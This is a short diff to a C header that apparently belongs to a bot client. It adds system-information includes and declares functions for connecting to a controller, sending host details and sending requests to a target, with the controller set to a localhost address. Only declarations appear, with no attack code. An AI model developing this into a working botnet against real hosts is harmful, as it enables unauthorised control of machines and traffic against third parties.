@@ -27,7 +27,9 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <sys/sysinfo.h>
 #include <string.h>
+#include <sys/utsname.h>
 
 
 #define C_PORT "PORT"
@@ -35,5 +37,15 @@
 #define PROTOCOL "http://"
 #define CONTROLLER_PORT 8081L
 #define CONTROLLER_IP "127.0.1.1"
+
+
+void setBotIP();
+int connectToController();
+int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
+                   const char *method, const char *version, const char *upload_data,
+                   size_t *upload_data_size, void **con_cls);
+int sendRequestToTarget(const char* request);
+int sendSystemInfo(char * info);
+
 
 #endif
